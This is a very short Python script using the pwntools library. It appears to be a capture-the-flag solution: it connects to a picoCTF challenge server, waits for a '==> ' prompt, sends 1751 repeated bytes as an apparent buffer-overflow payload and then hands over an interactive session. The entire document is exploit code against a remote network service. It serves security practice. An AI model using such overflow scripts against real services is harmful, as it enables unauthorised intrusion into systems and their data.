from pwn import *

HOST = "foggy-cliff.picoctf.net"
PORT =  56686

io = remote(HOST, PORT)

io.sendlineafter(b"==> ", b"\x65"*1751)

io.interactive()

io.close()